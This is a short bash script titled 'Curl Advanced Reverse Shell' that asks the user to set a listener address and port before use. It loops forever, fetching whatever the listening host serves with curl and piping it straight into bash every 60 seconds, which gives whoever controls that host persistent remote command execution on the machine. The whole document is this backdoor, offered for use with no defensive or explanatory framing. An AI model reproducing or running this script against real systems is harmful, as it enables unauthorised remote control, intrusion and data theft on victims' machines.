#!/bin/bash
# Curl Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4458

while true; do
    curl -s http://$LHOST:$LPORT/ | bash
    sleep 60
done
